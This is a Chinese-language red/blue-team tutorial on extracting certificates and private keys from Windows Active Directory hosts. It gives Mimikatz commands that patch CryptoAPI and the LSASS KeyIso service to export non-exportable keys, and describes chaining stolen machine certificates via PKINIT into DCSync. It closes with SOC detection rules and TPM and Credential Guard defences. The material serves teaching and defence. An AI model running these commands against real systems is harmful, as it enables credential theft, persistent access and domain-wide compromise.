在 AD（Active Directory）环境中，证书往往被视为比密码和 Kerberos 票据更具威胁的**长期高价值凭证**，因为它们通常具有数年的有效期，且不受常规密码重置策略的影响。

### 一、 底层架构：Windows 证书与密钥存储机制

Windows 并非将所有证书混在一起，而是通过注册表将其组织为逻辑容器（Stores），并依赖两套不同的 API 处理底层密码学运算。

#### 1. 证书存储容器 (System Store Types)

- **CURRENT_USER**：当前用户证书。存储路径：`HKCU\Software\Microsoft\SystemCertificates`。
- **LOCAL_MACHINE**：机器级证书，所有用户可访问。存储路径：`HKLM\SOFTWARE\Microsoft\SystemCertificates`。
- **SERVICES**：特定服务的独立存储。存储路径：`HKLM\SOFTWARE\Microsoft\Cryptography\Services\<ServiceName>\SystemCertificates`。
- **核心目标 ("My" Store)**：在上述系统容器中，**"My"（个人）存储区**是攻击者的首选目标，因为这里存放着包含私钥的身份验证证书。

#### 2. 密钥存储机制 (CryptoAPI vs CNG)

- **CryptoAPI (Legacy 遗留 API)**：
    - 密钥文件存储路径：`%APPDATA%\Microsoft\Crypto\RSA\<SID>\`。
    - 特点：老旧，多用于旧版智能卡或遗留系统。
- **CNG (Cryptography API: Next Generation 现代 API)**：
    - 由 Key Storage Provider (KSP) 管理，密钥文件存储路径：`%APPDATA%\Microsoft\Crypto\Keys\`。
    - 特点：现代标准，由 LSASS 进程中的 **KeyIso** 服务统一托管。

**关于“不可导出 (Non-Exportable)”的真相**： 证书属性中的“Exportable: NO”只是一个安全标志。标准 Windows 工具会拒绝导出私钥，但为了让 OS 能够使用该私钥进行签名或解密，**密钥材料必然存在于内存中**。只要拥有足够权限，攻击者就能将其提取。


### 二、 Mimikatz 核心命令与内存补丁技术

Mimikatz 的 `crypto` 模块是提取这些资产的“手术刀”。其核心原理是通过**内存补丁 (Memory Patching)** 绕过 CryptoAPI 和 CNG 的导出限制。

#### 1. 侦察与枚举

在导出前，先摸清证书分布：输出中会明确标识 `Exportable key : NO` 或 `YES`。
```
# 枚举当前用户的证书存储区
mimikatz # crypto::stores /systemstore:current_user

# 列出 "My" 存储区中的个人证书
mimikatz # crypto::certificates /systemstore:current_user /store:My
```

#### 2. 导出常规证书

如果证书标记为可导出，直接提取：
```
mimikatz # crypto::certificates /export
```
_注：导出的私钥会打包为 `.pfx` 文件，Mimikatz 默认使用密码 `mimikatz` 保护该文件。_

#### 3. 突破“不可导出”限制 (核心攻击技术)

当遇到 `Exportable key : NO` 时，必须对加密提供程序进行内存补丁。

**方法 A：补丁 CryptoAPI (针对 Legacy 证书)** 直接修补当前 Mimikatz 进程的内存：
```
mimikatz # crypto::capi
# 输出: Local CryptoAPI RSA CSP patched
```
补丁后，再次执行 `crypto::certificates /export` 即可无视限制导出私钥。

**方法 B：补丁 CNG (针对现代证书)** 现代证书由 LSASS 中的 `KeyIso` 服务管理。因此，必须**提升至 SYSTEM 权限**，并修补 LSASS 进程的内存：
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # crypto::cng
# 输出: "KeyIso" service patched
```

### 三、 高阶攻击场景 (实战链路)

#### 1. 服务账户证书窃取 (极致持久化)

- **场景**：域内的服务账户（如 `svc_sql`）通常配置了有效期长达 5 年的证书，用于内部 Web 服务或数据库身份验证。
- **利用**：通过 `crypto::cng` 补丁导出该服务账户的 `.pfx` 证书。
- **战略价值**：即使管理员定期更改了 `svc_sql` 的密码，或者禁用了该账户的密码登录，**只要证书未过期且未被手动吊销，攻击者依然可以使用该证书进行身份验证**，实现完美的持久化。

#### 2. 计算机证书窃取与 DCSync

- **场景**：域内每台计算机在 `LOCAL_MACHINE` 存储区都有自己的计算机证书。
- **利用**：提取目标服务器的计算机证书（如 `SERVER01$`）。
- **链路**：使用 Rubeus 等工具，通过 **PKINIT 协议**使用该计算机证书进行 Kerberos 身份验证，获取 TGT。由于计算机账户通常具有活动目录的复制权限（Replication Rights），攻击者可以直接从非域控机器上发起 **DCSync 攻击**，窃取所有域用户的哈希。

---

### 四、 防御体系与 SOC 检测规则

#### 1. 蓝队检测规则 (SOC View)

- **Sysmon Event ID 10 (Process Access)**：
    - 监控任何进程访问 `lsass.exe`。如果调用掩码 (Call Trace) 包含 `0x1410` 或 `0x1010`，且源进程行为异常，极大概率是 Mimikatz 正在执行 `crypto::cng` 进行内存补丁。
- **文件创建监控**：
    - 监控用户目录或临时目录下 `.pfx` 或 `.p12` 文件的创建。特别是文件名包含 `CURRENT_USER_My_` 这种 Mimikatz 默认命名规则的文件。
- **CNG 操作日志**：
    - 启用 `Microsoft-Windows-Crypto-NCrypt/Operational` 日志。
    - 监控 **Event ID 3 (NCrypt operation failure)**。如果短时间内出现大量失败，可能是自动化工具在暴力枚举或尝试导出受保护的密钥。

#### 2. 系统级防御策略

- **硬件级密钥保护 (TPM)**：
    - **终极防御**。在 AD CS (证书服务) 模板中，强制要求使用 **Microsoft Platform Crypto Provider (TPM)**。
    - **原理**：私钥在 TPM 芯片内部生成且**永远无法离开 TPM**。无论攻击者如何补丁 LSASS 内存，都无法提取出私钥本身，只能调用 TPM 进行签名操作。
- **Credential Guard (凭据保护)**：
    - 启用基于虚拟化的安全 (VBS)。将 LSASS 中的敏感凭证隔离在安全的虚拟化容器 (Secure Enclave) 中，Mimikatz 运行在普通内核态，无法跨越 VBS 边界读取内存。
- **缩短证书生命周期**：
    - 废除 5 年或 10 年有效期的证书。强制实施 1 年或更短的有效期，并配置自动吊销列表 (CRL) / OCSP，大幅降低被盗证书的战略价值。